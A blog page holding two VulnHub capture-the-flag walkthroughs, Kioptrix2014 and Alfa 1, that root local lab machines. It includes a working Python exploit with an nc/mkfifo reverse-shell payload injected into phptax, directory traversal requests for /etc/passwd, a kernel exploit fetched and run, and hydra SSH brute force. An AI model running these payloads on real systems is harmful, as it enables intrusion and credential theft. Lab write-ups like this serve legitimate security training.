    <h1 class="post-title">VulnHub - Kioptrix2014</h1>
	<p class="post-date text-bold text-upcase">
	<span>November 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This vulnerable machine is targeted at the beginner. It’s not meant for the seasoned pentester or security geek that’s been at this sort of stuff for 10 years.</p>

<p><strong>Author:</strong> Kioptrix</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">https://www.vulnhub.com/entry/kioptrix-2014-5,62/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>The machine was discovered on the local network with arp scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.0/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.168 00:0c:29:5f:78:95       VMware, Inc.
192.168.179.254 00:50:56:ee:a4:9d       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan found two available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-T5</span> <span class="nt">-p-</span> <span class="nt">--open</span> 192.168.179.168 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 00:0C:29:5F:78:95 <span class="o">(</span>VMware<span class="o">)</span>
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Service detection and script scanning was performed against open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p80</span>,8080 192.168.179.168 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.2.21 <span class="o">((</span>FreeBSD<span class="o">)</span> mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET
|_http-server-header: Apache/2.2.21 <span class="o">(</span>FreeBSD<span class="o">)</span> mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
8080/tcp open  http    Apache httpd 2.2.21 <span class="o">((</span>FreeBSD<span class="o">)</span> mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8<span class="o">)</span>
|_http-title: 403 Forbidden
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>Nothing was found on the web page, so I decided to enumerate the source page and found a link to another page.</p>

<p><img src="/assets/images/kioptrix2014/screenshot-1.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.168/ | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'pC[^"]*'</span>  
pChart2.1.3/index.php
</code></pre></div></div>

<p>There’s a Directory Traversal exploit for this version of pechart, so we proceed download the exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget https://www.exploit-db.com/download/31173
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="directory-traversal">Directory Traversal</h3>

<p>PHP library pChart 2.1.3 (and possibly previous versions) by default contains an examples folder, where the application is vulnerable to Directory Traversal and Cross-Site Scripting (XSS).</p>

<p>We check the proof of concept, as we can see the content of the passwd file is displayed on the screen.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.168/pChart2.1.3/examples/index.php?Action<span class="o">=</span>View&amp;Script<span class="o">=</span>%2f..%2f..%2fetc/passwd
</code></pre></div></div>

<p><img src="/assets/images/kioptrix2014/screenshot-2.png" alt="" /></p>

<p>Listing the default apache configuration file, we can see the document root of the service running on port 8080, and the user agent allowed to access it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.168/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf"</span> | html2text | <span class="nb">tail</span> <span class="nt">-19</span>

SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser

&lt;VirtualHost <span class="k">*</span>:8080&gt;
    DocumentRoot /usr/local/www/apache22/data2

&lt;Directory <span class="s2">"/usr/local/www/apache22/data2"</span><span class="o">&gt;</span>
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env<span class="o">=</span>Mozilla4_browser
&lt;/Directory&gt;



&lt;/VirtualHost&gt;


Include etc/apache22/Includes/<span class="k">*</span>.conf
</code></pre></div></div>

<p>We check with the curl utility when requesting the web service with the user agent Mozilla/4.0.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-A</span> <span class="s1">'Mozilla/4.0'</span> http://192.168.179.168:8080/
&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 3.2 Final//EN"</span><span class="o">&gt;</span>
&lt;html&gt;
 &lt;<span class="nb">head</span><span class="o">&gt;</span>
  &lt;title&gt;Index of /&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /&lt;/h1&gt;
&lt;ul&gt;&lt;li&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"phptax/"</span><span class="o">&gt;</span> phptax/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div></div>

<p>The normal access with the browser is forbidden.</p>

<p><img src="/assets/images/kioptrix2014/screenshot-3.png" alt="" /></p>

<p>So we need to set up burp to access the web page, follow the corresponding instructions:</p>

<p>Open BurpSuite, click on Proxy -&gt; Options -&gt; Match and Replace, and we define the custom user-agent.</p>

<p><img src="/assets/images/kioptrix2014/screenshot-4.png" alt="" /></p>

<p>Now we can access to the page, click on the link.</p>

<p><img src="/assets/images/kioptrix2014/screenshot-5.png" alt="" /></p>

<p><img src="/assets/images/kioptrix2014/screenshot-6.png" alt="" /></p>

<h3 id="remote-code-execution">Remote Code Execution</h3>

<p>Googling I found that phptax is vulnerable to remote code execution, we downloaded the exploit to analyze the proof of concept.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget https://www.exploit-db.com/download/21665
</code></pre></div></div>

<p>To exploit it, I developed a python script that replicates the exploitation process and gets a shell automatically.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">urllib3</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Usage: {} [RHOST] [LHOST] [LPORT]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">rhost</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">lhost</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="n">lport</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc {} {} &gt; /tmp/f"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">)</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">"http://{}:8080/phptax/drawimage.php?pfilez=xxx;{};&amp;pdf=make"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="n">http</span> <span class="o">=</span> <span class="n">urllib3</span><span class="p">.</span><span class="n">PoolManager</span><span class="p">()</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s">'GET'</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'User-Agent'</span><span class="p">:</span><span class="s">'Mozilla/4.0'</span><span class="p">})</span>

<span class="k">def</span> <span class="nf">listener</span><span class="p">():</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"nc -vlnp {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">lport</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span> 
    <span class="n">l</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">listener</span><span class="p">)</span>
    <span class="n">e</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">exploit</span><span class="p">)</span>

    <span class="n">l</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">e</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<p>We run the exploit and we get a shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 pwn.py 192.168.179.168 192.168.179.1 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.168] 56350
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>
/bin/csh <span class="nt">-i</span>
Warning: no access to <span class="nb">tty</span> <span class="o">(</span>Bad file descriptor<span class="o">)</span><span class="nb">.</span>
Thus no job control <span class="k">in </span>this shell.
kioptrix2014#
</code></pre></div></div>

<p>By listing the kernel version, it appears to be vulnerable to kernel exploitation.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kioptrix2014# <span class="nb">uname</span> <span class="nt">-a</span>
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE <span class="c">#0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="linux-kernel">Linux Kernel</h3>

<p>The vm_map_lookup function in sys/vm/vm_map.c in the mmap implementation in the kernel in FreeBSD 9.0 through 9.1-RELEASE-p4 does not properly determine whether a task should have write access to a memory location, which allows local users to bypass filesystem write permissions and consequently gain privileges via a crafted application that leverages read permissions, and makes mmap and ptrace system calls.</p>

<p>We download the exploit and start a web server with python.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget https://www.exploit-db.com/download/26368

root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server
</code></pre></div></div>

<p>On the attacking machine, we download the exploit, compile it and execute it, as we can see we gain root privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kioptrix2014# <span class="nb">cd</span> /tmp
kioptrix2014# fetch <span class="nt">-o</span> 26368.c http://192.168.179.1:8000/26368
kioptrix2014# gcc 26368.c <span class="nt">-o</span> 26368
kioptrix2014# ./26368
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/csh <span class="nt">-i</span>
Warning: no access to <span class="nb">tty</span> <span class="o">(</span>Bad file descriptor<span class="o">)</span><span class="nb">.</span>
Thus no job control <span class="k">in </span>this shell.
kioptrix2014# <span class="nb">cd</span> /root
kioptrix2014# <span class="nb">head </span>congrats.txt
If you are reading this, it means you got root <span class="o">(</span>or cheated<span class="o">)</span><span class="nb">.</span>
Congratulations either way...

Hope you enjoyed this new VM of mine. As always, they are made <span class="k">for </span>the beginner <span class="k">in 
</span>mind, and not meant <span class="k">for </span>the seasoned pentester. However this does not mean one 
can<span class="s1">'t enjoy them.

As with all my VMs, besides getting "root" on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, in my mind,
are information gathering &amp; research. Anyone can throw massive amounts of exploits
</span></code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Alfa 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>November 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This is another vulnerable box to prepare for the OSCP.</p>

<p><strong>Author:</strong> d4t4s3c</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root and read the only flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/alfa-1,655/">https://www.vulnhub.com/entry/alfa-1,655/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>The target host was located with a ping scan, the script you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.167 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan was performed with nmap to find available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.167 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
65111/tcp open  unknown
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Service detection and script scanning were performed against the target to list more specific information about each port.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,80,139,445,65111 192.168.179.167 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
|_drwxr-xr-x    2 0        0            4096 Dec 17  2020 thomas
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.179.1
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http        Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Alfa IT Solutions
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
65111/tcp open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 ad:3e:8d:45:48:b1:63:88:63:47:64:e5:62:28:6d:02 <span class="o">(</span>RSA<span class="o">)</span>
|   256 1d:b3:0c:ca:5f:22:a4:17:d6:61:b5:f7:2c:50:e9:4c <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 42:15:88:48:17:42:69:9b:b6:e1:4e:3e:81:0b:68:0c <span class="o">(</span>ED25519<span class="o">)</span>
</code></pre></div></div>

<h3 id="ftp-enumeration">FTP Enumeration</h3>

<p>As we can see the anonymous login is enabled, so I mounted the FTP service locally, copied the thomas directory to my current directory, this contains the image of a dog named milo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curlftpfs anonymous:@192.168.179.167 /mnt/ftp
root@kali:~<span class="nv">$ </span><span class="nb">ls</span> /mnt/ftp 
thomas
root@kali:~<span class="nv">$ </span><span class="nb">cp</span> <span class="nt">-r</span> /mnt/ftp/thomas <span class="nb">.</span>
root@kali:~<span class="nv">$ </span><span class="nb">ls </span>thomas         
milo.jpg
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>Visiting the home page of the web application I didn’t find anything, so I decided request the robots.txt file and found some directories and a string in brainfuck language.</p>

<p><img src="/assets/images/alfa/screenshot-1.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.167/robots.txt | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'1,8p;$p'</span>
/home
/admin
/login
/images
/cgi-bin
/intranet
/wp-admin
/wp-login
++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++<span class="o">&lt;&lt;&lt;</span>&lt;-]&gt;&gt;+++++++++++++++++.&gt;&gt;---.+++++++++++.------.-----.&lt;&lt;<span class="nt">--</span>.&gt;&gt;++++++++++++++++++.++.-----..-.+++.++.
</code></pre></div></div>

<p>I decoded it, and accessed the <strong>/alfa-support</strong> directory.</p>

<p><img src="/assets/images/alfa/screenshot-2.png" alt="" /></p>

<p>This contains a dialogue where Tomas states that he only remembers part of his password which is the name of his pet followed by three numbers, asking to reset his password.</p>

<p><img src="/assets/images/alfa/screenshot-3.png" alt="" /></p>

<p>We can use those specifications to create our dictionary of words, a oneliner bash script could do that for us.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="k">for </span>x <span class="k">in</span> <span class="o">{</span>000..999<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo </span>milo<span class="nv">$x</span><span class="p">;</span><span class="k">done</span> <span class="o">&gt;</span> thomas.pass
</code></pre></div></div>

<h3 id="samba-enumeration">Samba Enumeration</h3>

<p>By Listing the Samba service, it was possible to verify that Thomas is a local user of the system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>enum4linux <span class="nt">-a</span> 192.168.179.167
...
S-1-22-1-1000 Unix User<span class="se">\t</span>homas <span class="o">(</span>Local User<span class="o">)</span> 
</code></pre></div></div>

<p>The most logical thing would be to brute force the SSH service.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hydra <span class="nt">-l</span> thomas <span class="nt">-P</span> thomas.pass ssh://192.168.179.167:65111
...
<span class="o">[</span>65111][ssh] host: 192.168.179.167   login: thomas   password: milo666
1 of 1 target successfully completed, 1 valid password found
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>

<p>As we can see above the password of Thomas was found and we accessed via SSH.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> thomas 192.168.179.167 <span class="nt">-p</span> 65111
thomas@192.168.179.167<span class="s1">'s password:                                                                                                                                  
Linux Alfa 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64                                                                                             
                                                                                                                                                                    
####################################################################                                                                                                
#                  ,---------------------------,                   #                                                                                                
#                  |  /---------------------\  |                   #                                                                                                
#                  | |                       | |                   #                                                                                                
#                  | |         +----+        | |                   #                                                                                                
#                  | |         |ALFA|        | |                   #                                                                                                
#                  | |         +----+        | |                   #                                                                                                
#                  | |                       | |                   #                                                                                                
#                  |  \_____________________/  |                   #                                                                                                
#                  |___________________________|                   #                                                                                                
#                ,---\_____     []     _______/------,             #                                                                                                
#              /         /______________\           /|             #                                                                                                
#            /___________________________________ /  | ___         #                                                                                                
#            |                                   |   |    )        #                                                                                                
#            |  _ _ _                 [-------]  |   |   (         #                                                                                                
#            |  o o o                 [-------]  |  /    _)_       #                                                                                                
#            |__________________________________ |/     /  /       #                                                                                                
#        /-------------------------------------/|      ( )/        #                                                                                                
#      /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                   #
#    /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                     #
#     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       #
#  ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗  #
#  ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝  #
#  ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗    #
#  ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝    #
#  ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗  #
#   ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝  #
####################################################################

thomas@Alfa:~$
</span></code></pre></div></div>

<p>The first flag was located in the home directory of Thomas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thomas@Alfa:~<span class="nv">$ </span><span class="nb">ls
</span>user.txt
thomas@Alfa:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 


.-----------------------------------------------------------------------------.
<span class="o">||</span>Es| |F1 |F2 |F3 |F4 |F5 | |F6 |F7 |F8 |F9 |F10|                             |
<span class="o">||</span>__| |___|___|___|___|___| |___|___|___|___|___|                             |
| _____________________________________________     ________    ___________   |
<span class="o">||</span>~  |! |<span class="s2">" |§ |</span><span class="nv">$ </span><span class="s2">|% |&amp; |/ |( |) |= |? |</span><span class="sb">`</span> <span class="o">||</span> |&lt;-|   |Del|Help|  |<span class="o">{</span> |<span class="o">}</span> |/ |<span class="k">*</span> |  |
<span class="o">||</span><span class="sb">`</span><span class="s2">__|1_|2_|3_|4_|5_|6_|7_|8_|9_|0_|ß_|´_|</span><span class="se">\_</span><span class="s2">|__|   |___|____|  |[ |]_|__|__|  |
||&lt;-  |Q |W |E |R |T |Z |U |I |O |P |Ü |* |   ||               |7 |8 |9 |- |  |
||-&gt;__|__|__|__|__|__|__|__|__|__|__|__|+_|_  ||               |__|__|__|__|  |
||Ctr|oC|A |S |D |F |G |H |J |K |L |Ö |Ä |^ |&lt;'|               |4 |5 |6 |+ |  |
||___|_L|__|__|__|__|__|__|__|__|__|__|__|#_|__|       __      |__|__|__|__|  |
||^    |&gt; |Y |X |C |V |B |N |M |; |: |_ |^     |      |A |     |1 |2 |3 |E |  |
||_____|&lt;_|__|__|__|__|__|__|__|,_|._|-_|______|    __||_|__   |__|__|__|n |  |
|   |Alt|A  |                       |A  |Alt|      |&lt;-|| |-&gt;|  |0    |. |t |  |
|   |___|___|_______________________|___|___|      |__|V_|__|  |_____|__|e_|  |
|                                                                             |
</span><span class="sb">`</span><span class="nt">-----------------------------------------------------------------------------</span><span class="s1">'


user_flag==&gt;&gt; M4Mh5FX8EGGGSV6CseRuyyskG

</span></code></pre></div></div>

<p>Listing the services, there’s one running locally on port 5901.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thomas@Alfa:~<span class="nv">$ </span>ss <span class="nt">-antl</span>                                                                                           
State                 Recv-Q                Send-Q                 Local Address:Port                  Peer Address:Port
LISTEN                0                     128                          0.0.0.0:65111                      0.0.0.0:<span class="k">*</span>
LISTEN                0                     50                           0.0.0.0:445                        0.0.0.0:<span class="k">*</span>
LISTEN                0                     50                           0.0.0.0:139                        0.0.0.0:<span class="k">*</span>
LISTEN                0                     5                          127.0.0.1:5901                       0.0.0.0:<span class="k">*</span>
LISTEN                0                     32                                 <span class="k">*</span>:21                               <span class="k">*</span>:<span class="k">*</span>
LISTEN                0                     128                             <span class="o">[</span>::]:65111                         <span class="o">[</span>::]:<span class="k">*</span>
LISTEN                0                     50                              <span class="o">[</span>::]:445                           <span class="o">[</span>::]:<span class="k">*</span>
LISTEN                0                     50                              <span class="o">[</span>::]:139                           <span class="o">[</span>::]:<span class="k">*</span>
LISTEN                0                     5                              <span class="o">[</span>::1]:5901                          <span class="o">[</span>::]:<span class="k">*</span>
LISTEN                0                     128                                <span class="k">*</span>:80                               <span class="k">*</span>:<span class="k">*</span>
</code></pre></div></div>

<p>Local Port Forwarding allow me to connect from the local machine to another server securely, so all data sent to port 4444 on attacking machine is forwarded to port 5901 on target host.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-L</span> 127.0.0.1:4444:127.0.0.1:5901 <span class="nt">-l</span> thomas 192.168.179.167 <span class="nt">-p</span> 65111 <span class="nt">-N</span>
thomas@192.168.179.167<span class="s1">'s password:
</span></code></pre></div></div>

<p>Locally we can check that port 4444 is listening.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ss <span class="nt">-antl</span> | <span class="nb">grep </span>4444
LISTEN 0      128        127.0.0.1:4444      0.0.0.0:<span class="k">*</span> 
</code></pre></div></div>

<p>Service enumeration and script scanning was performed locally on port 4444 to detect which service is running on it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p4444</span> 127.0.0.1
...
PORT     STATE SERVICE VERSION
4444/tcp open  vnc     VNC <span class="o">(</span>protocol 3.8<span class="o">)</span>
</code></pre></div></div>

<p>In the previous result we can see that the VNC service is running, also in the home directory of Thomas the <strong>.remote_secret</strong> file was found.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thomas@Alfa:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>   
...
<span class="nt">-rwxrwxrwx</span> 1 root   root     16 dic 17  2020 .remote_secret 
...
</code></pre></div></div>

<p>We start a web server with python on target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thomas@Alfa:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server
</code></pre></div></div>

<p>We download it to the attacking machine with wget.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget 192.168.179.167:8000/.remote_secret
</code></pre></div></div>

<h2 id="privile-escalation">Privile Escalation</h2>
<h3 id="access-via-vnc">Access via VNC</h3>

<p>We connect to VNC using the <strong>.remote_secret</strong> file as password, and we have access to a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>vncviewer <span class="nt">-passwd</span> .remote_secret 127.0.0.1:4444
</code></pre></div></div>

